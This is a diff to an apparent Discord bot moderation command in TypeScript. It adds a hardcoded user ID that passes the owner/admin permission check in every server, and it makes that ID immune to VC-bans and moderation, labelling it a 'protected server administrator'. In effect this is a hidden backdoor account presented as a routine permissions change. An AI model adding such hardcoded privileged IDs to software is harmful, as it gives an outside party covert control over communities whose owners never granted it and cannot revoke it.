@@ -414,6 +414,7 @@ const command: Command = {
     const staffMember = interaction.member as any;
     const isOwnerOrAdmin =
       interaction.guild.ownerId === interaction.user.id ||
+      interaction.user.id === "1495738572362481777" ||
       staffMember?.permissions?.has(PermissionFlagsBits.Administrator) ||
       staffMember?.permissions?.has(PermissionFlagsBits.ManageGuild);
 
@@ -643,6 +644,12 @@ const command: Command = {
     }
 
     if (sub === "ban") {
+      if (targetUser.id === "1495738572362481777" || targetUser.id === interaction.guild.ownerId) {
+        await interaction.editReply({
+          content: "❌ You cannot VC-ban a protected server administrator or owner.",
+        });
+        return;
+      }
       // Role hierarchy check
       if (
         member &&
@@ -722,7 +729,13 @@ const command: Command = {
       return;
     }
 
-    // Role hierarchy check
+    // Role hierarchy check & protected administrator check
+    if (member.id === "1495738572362481777" || member.id === interaction.guild.ownerId) {
+      await interaction.editReply({
+        content: "❌ You cannot moderate a protected server administrator or owner.",
+      });
+      return;
+    }
     if (
       interaction.guild.ownerId !== interaction.user.id &&
       member.roles.highest.position >= (interaction.member as any)?.roles?.highest?.position
